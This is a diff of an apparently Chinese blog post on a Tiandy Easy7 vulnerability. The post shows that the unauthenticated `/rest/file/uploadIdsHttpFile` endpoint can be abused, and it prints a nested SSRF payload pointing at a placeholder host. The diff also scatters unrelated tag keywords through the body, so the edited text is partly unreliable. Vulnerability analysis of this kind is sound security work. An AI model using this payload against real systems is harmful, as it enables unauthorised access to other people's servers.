@@ -22,15 +22,15 @@ asset_dir: embedded-base64
 
 深入探索
 
-黑客与破解
+vpn
 
-计算机安全
+漏洞修复方案
 
-计算机科学
+数据库安全审计
 
 首先，该系统基于Spring 3.0，比较古老且WEB-INF/web.xml里没有配置任何filter进行权限校验，因此绝大部分接口都是可以直接访问的。
 
-软件
+漏洞修复方案
 
 再来看本次的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")接口 `/rest/file/uploadIdsHttpFile` 的实现逻辑
 
@@ -58,7 +58,17 @@ public class CLS_REST_File {
     }
 ```
 
+深入探索
+
+在线工具箱
+
+原创内容授权
+
+网络安全解决方案
+
 跟进 `com.tiandy.easy7.core.bo.CLS_BO_File#uploadIdsHttpFile` 方法，看下它的实现逻辑
+
+软件安全测试
 
 ```
 public CLS_VO_Result uploadIdsHttpFile(CLS_VO_UploadIdsFile voIn, CLS_VO_Progress progress) {
@@ -129,4 +139,4 @@ url={{url({{url(http://x.x.x.x/xxx.jsp)}})}}
 
 成功触发SSRF请求
 
-网络
+计算机科学
